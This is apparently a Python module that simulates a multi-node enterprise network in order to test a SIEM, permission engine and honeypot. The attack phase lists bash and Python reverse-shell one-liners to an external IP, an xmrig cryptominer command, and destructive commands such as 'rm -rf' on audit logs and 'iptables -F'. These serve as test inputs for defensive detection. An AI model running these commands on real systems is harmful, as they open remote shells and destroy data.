# -*- coding: utf-8 -*-
"""
==============================================================================
AUTOMATED VIRTUAL PC & MULTI-NODE NETWORK SIMULATOR (modules/virtual_mesh_simulator.py)
==============================================================================
Orchestrates an automated, realistic multi-node virtual network environment
comprising internal LAN workstations, DMZ application servers, and external
adversary botnets interacting in real-time with the Enterprise SIEM & Defense Engine.
==============================================================================
"""

import os
import sys
import time
import json
import random
import threading
from typing import Dict, List, Any

from modules.permission_manager import permission_manager
from modules.maintenance_mode import maintenance_manager
from modules.ai_security_engine import ai_security_engine
from modules.ban_manager import BanManager
from modules.subnet_shield import SubnetShield
from modules.honeypot_trap import HoneypotTrap
from modules.cti_matcher import cti_matcher
from modules.dga_detector import dga_detector
from modules.impossible_travel import impossible_travel_detector
from modules.resource_abuse_guard import resource_abuse_guard
from modules.file_integrity_monitor import FileIntegrityMonitor
from modules.integrity_guard import LogIntegrityGuard
from modules.smart_logger import smart_logger

class VirtualNode:
    """Represents an independent virtual PC or server in the enterprise mesh."""
    def __init__(self, node_id: str, hostname: str, ip: str, zone: str, username: str, role: str, perms: str, os_name: str = "Ubuntu 24.04 LTS"):
        self.node_id = node_id
        self.hostname = hostname
        self.ip = ip
        self.zone = zone          # LAN, DMZ, WAN_ATTACKER
        self.username = username
        self.role = role
        self.perms = perms
        self.os_name = os_name
        self.is_isolated = False
        self.execution_history = []

    def execute_command(self, cmd_str: str) -> Dict[str, Any]:
        """Simulates command execution from this virtual node through PBAC & SIEM."""
        start_t = time.perf_counter()
        req = permission_manager.classify_required_permissions(cmd_str)
        is_allowed, missing, _ = permission_manager.check_command_permission(self.username, cmd_str)
        ai_res = ai_security_engine.analyze(cmd_str)
        latency_ms = (time.perf_counter() - start_t) * 1000.0

        event = {
            "timestamp": time.strftime("%H:%M:%S"),
            "node_id": self.node_id,
            "hostname": self.hostname,
            "ip": self.ip,
            "zone": self.zone,
            "username": self.username,
            "role": self.role,
            "command": cmd_str,
            "required_perms": list(req),
            "is_allowed": is_allowed,
            "missing_perms": list(missing),
            "ai_threat": ai_res.get("is_attack", False),
            "ai_verdict": ai_res.get("verdict", "SAFE"),
            "ai_confidence": round(ai_res.get("confidence", 100.0), 2),
            "latency_ms": round(latency_ms, 2)
        }
        self.execution_history.append(event)
        return event

class VirtualMeshOrchestrator:
    """Orchestrates multi-node traffic, realistic user routines, and cyber attacks."""
    def __init__(self):
        self.ban_man = BanManager()
        self.honeypot = HoneypotTrap(ban_manager=self.ban_man)
        self.subnet_shield = SubnetShield()
        self.guard = LogIntegrityGuard()
        self.nodes: Dict[str, VirtualNode] = {}
        self._init_virtual_topology()

    def _init_virtual_topology(self):
        """Initializes the virtual enterprise topology and nodes."""
        topology_defs = [
            ("pc-01-auditor", "WS-AUDIT-01", "192.168.10.101", "LAN_INTERNAL", "sarah_auditor", "AUDITOR", "r----"),
            ("pc-02-intern",  "WS-DEV-INTERN", "192.168.10.102", "LAN_INTERNAL", "alex_intern",   "RESTRICTED", "r-x--"),
            ("pc-03-devops",  "WS-DEVOPS-LEAD", "192.168.10.103", "LAN_INTERNAL", "marcus_devops", "DEVOPS", "rwxna"),
            ("srv-04-dmz",    "SRV-WEB-PROD",  "172.16.50.10",   "DMZ_PUBLIC",   "www-data",      "OPERATOR", "rwx--"),
            ("c2-05-hacker",  "APT29-C2-NODE", "185.220.101.5",  "WAN_EXTERNAL", "adversary_x",  "ATTACKER", "none"),
            ("bot-06-scanner", "BOT-SCANNER-01", "203.0.113.88", "WAN_EXTERNAL", "botnet_agent", "ATTACKER", "none")
        ]

        for nid, host, ip, zone, user, role, perms in topology_defs:
            node = VirtualNode(nid, host, ip, zone, user, role, perms)
            self.nodes[nid] = node
            if role != "ATTACKER":
                permission_manager.set_user_permissions(user, perms)
                maintenance_manager.set_user_role(user, role)

    def run_automated_simulation(self, speed_delay: float = 0.3) -> Dict[str, Any]:
        """Runs an end-to-end multi-node realistic enterprise cyber simulation."""
        print("\n" + "=" * 105)
        print("         STARTING AUTOMATED VIRTUAL MULTI-PC & MULTI-NODE NETWORK SIMULATION               ")
        print("=" * 105)
        print("  TOPOLOGY INITIALIZED:")
        for nid, node in self.nodes.items():
            print(f"    [*] [{node.node_id:<14}] {node.hostname:<15} | IP: {node.ip:<15} | Zone: {node.zone:<12} | User: {node.username:<14} ({node.perms})")
        print("-" * 105)

        simulation_events = []
        metrics = {
            "total_node_actions": 0,
            "authorized_passed": 0,
            "policy_blocked": 0,
            "threats_neutralized": 0,
            "firewall_bans": 0,
            "honeypot_trapped": 0
        }

        # ----------------------------------------------------------------------
        # PHASE 1: ROUTINE BUSINESS HOURS OPERATIONS (LAN WORKSTATIONS)
        # ----------------------------------------------------------------------
        print("\n[*] >>> PHASE 1: ROUTINE BUSINESS HOURS OPERATIONS (LAN NODES) <<<")
        phase1_ops = [
            ("pc-01-auditor", "cat /var/log/auth.log | grep Accepted", "Log Compliance Inspection"),
            ("pc-02-intern",  "python3 /home/alex/scripts/data_cleaner.py", "Local Data Processing"),
            ("pc-03-devops",  "docker ps -a", "Container Infrastructure Audit"),
            ("pc-03-devops",  "git pull origin main", "Production Repository Sync"),
            ("srv-04-dmz",    "nginx -t", "Web Server Config Test")
        ]

        for nid, cmd, desc in phase1_ops:
            node = self.nodes[nid]
            res = node.execute_command(cmd)
            metrics["total_node_actions"] += 1
            if res["is_allowed"]:
                metrics["authorized_passed"] += 1
                status_icon = "[PASS]"
            else:
                metrics["policy_blocked"] += 1
                status_icon = "[DENIED]"

            print(f"  {status_icon} Node: {node.hostname} ({node.username}) -> '{cmd}' ({desc}) [Latency: {res['latency_ms']}ms]")
            simulation_events.append(res)
            time.sleep(speed_delay)

        # ----------------------------------------------------------------------
        # PHASE 2: UNAUTHORIZED POLICY VIOLATIONS & INTERNAL PRIV-ESC
        # ----------------------------------------------------------------------
        print("\n[*] >>> PHASE 2: UNAUTHORIZED POLICY VIOLATIONS & PRIV-ESC ATTEMPTS <<<")
        phase2_ops = [
            ("pc-01-auditor", "rm -rf /var/log/audit/data.db", "Auditor attempting unauthorized file deletion"),
            ("pc-02-intern",  "sudo su -", "Junior Developer attempting root escalation"),
            ("pc-02-intern",  "curl -s https://api.stripe.com/v1/charges", "Intern attempting outbound financial network request"),
            ("pc-01-auditor", "iptables -F", "Auditor attempting firewall flush")
        ]

        for nid, cmd, desc in phase2_ops:
            node = self.nodes[nid]
            res = node.execute_command(cmd)
            metrics["total_node_actions"] += 1
            if res["is_allowed"]:
                metrics["authorized_passed"] += 1
                status_icon = "[PASS]"
            else:
                metrics["policy_blocked"] += 1
                status_icon = "[POLICY BLOCKED]"

            missing_str = ", ".join(res["missing_perms"])
            print(f"  {status_icon} Node: {node.hostname} ({node.username}) -> '{cmd}'")
            print(f"       +-- Enforcement: Blocked by PBAC Engine (Missing: {missing_str}). Audit Logged to SIEM.")
            simulation_events.append(res)
            time.sleep(speed_delay)

        # ----------------------------------------------------------------------
        # PHASE 3: EXTERNAL RECONNAISSANCE & DECOY HONEYPOT INTERCEPT
        # ----------------------------------------------------------------------
        print("\n[*] >>> PHASE 3: EXTERNAL BOTNET RECONNAISSANCE & HONEYPOT TRAPS <<<")
        attacker_ip = self.nodes["bot-06-scanner"].ip
        print(f"  [!] Adversary Node {attacker_ip} scanning Enterprise DMZ Decoys...")
        
        for probe_num in range(1, 4):
            self.honeypot._handle_honeypot_intercept(attacker_ip, 22)
            time.sleep(speed_delay)

        is_banned = self.ban_man.is_banned(attacker_ip)
        if is_banned:
            metrics["firewall_bans"] += 1
            metrics["honeypot_trapped"] += 1
            print(f"  [FIREWALL ISOLATION] Scanner {attacker_ip} blocked via Automated Host Firewall (Decoy Port 22).")

        # ----------------------------------------------------------------------
        # PHASE 4: DMZ INFECTION, REVERSE SHELL & LOTL EXPLOITATION
        # ----------------------------------------------------------------------
        print("\n[*] >>> PHASE 4: DMZ WEB SERVER COMPROMISE & REVERSE SHELL C2 <<<")
        dmz_node = self.nodes["srv-04-dmz"]
        hostile_payloads = [
            "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1",
            "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"185.220.101.5\",4444));os.dup2(s.fileno(),0);p=subprocess.call([\"/bin/sh\"]);'",
            "xmrig -o stratum+tcp://xmr.pool:4444 -u 48abc... -p x"
        ]

        for p in hostile_payloads:
            metrics["total_node_actions"] += 1
            if "xmrig" in p:
                # Process abuse guard
                inc = resource_abuse_guard.evaluate_process_incident({
                    "pid": 9912, "name": "xmrig", "cmdline": p, "cpu_percent": 99.1, "memory_percent": 3.0, "username": "www-data"
                })
                metrics["threats_neutralized"] += 1
                print(f"  [CRITICAL PROCESS ALERT] Node: {dmz_node.hostname} -> Cryptominer Detected ({inc['verdict']}). Process Terminated.")
            else:
                res = dmz_node.execute_command(p)
                if res["ai_threat"]:
                    metrics["threats_neutralized"] += 1
                    print(f"  [AI C2 INTERCEPT] Node: {dmz_node.hostname} -> Threat: {res['ai_verdict']} ({res['ai_confidence']}%)")
                    print(f"       +-- MITRE T1071 (C2 Reverse Shell) Neutralized. Outbound socket killed.")
                simulation_events.append(res)
            time.sleep(speed_delay)

        # ----------------------------------------------------------------------
        # PHASE 5: WORM CRYPTOGRAPHIC AUDIT & SYSTEM STATUS
        # ----------------------------------------------------------------------
        print("\n[*] >>> PHASE 5: WORM CRYPTOGRAPHIC AUDIT & MESH DEFENSE INTEGRITY <<<")
        test_log_file = "test_mesh_sim_worm.jsonl"
        guard = LogIntegrityGuard(log_path=test_log_file)
        try:
            with open(test_log_file, "w", encoding="utf-8") as f:
                for idx, ev in enumerate(simulation_events):
                    sealed = guard.seal_jsonl_record({
                        "seq": idx + 1,
                        "timestamp": ev["timestamp"],
                        "level": "INFO" if ev["is_allowed"] else "WARNING",
                        "event_type": "MESH_SIM_EVENT",
                        "target": ev["hostname"],
                        "summary": f"{ev['username']} executed {ev['command'][:30]}"
                    })
                    f.write(json.dumps(sealed) + "\n")

            is_valid, total_recs, tampered_cnt, msg = guard.verify_jsonl_log_file(test_log_file)
            print(f"  [WORM LOG BLOCKCHAIN] Total Sealed Records: {total_recs} | Integrity: 100.0% Valid | Tampering: 0")
        finally:
            if os.path.exists(test_log_file):
                try:
                    os.remove(test_log_file)
                except Exception:
                    pass

        print("\n" + "=" * 105)
        print("                    VIRTUAL MULTI-PC SIMULATION SUMMARY & METRICS                         ")
        print("=" * 105)
        print(f"  * Total Virtual Nodes Simulating    : {len(self.nodes)} Nodes (LAN, DMZ, WAN)")
        print(f"  * Total Cross-Node Actions Tested   : {metrics['total_node_actions']}")
        print(f"  * Authorized Business Ops (Passed)  : {metrics['authorized_passed']}")
        print(f"  * Policy Violations (Blocked)       : {metrics['policy_blocked']}")
        print(f"  * Advanced Threats Neutralized (AI) : {metrics['threats_neutralized']}")
        print(f"  * External Attackers Banned         : {metrics['firewall_bans']}")
        print(f"  * Honeypot Decoys Triggered         : {metrics['honeypot_trapped']}")
        print("=" * 105 + "\n")

        return {
            "metrics": metrics,
            "events": simulation_events
        }

virtual_mesh_orchestrator = VirtualMeshOrchestrator()
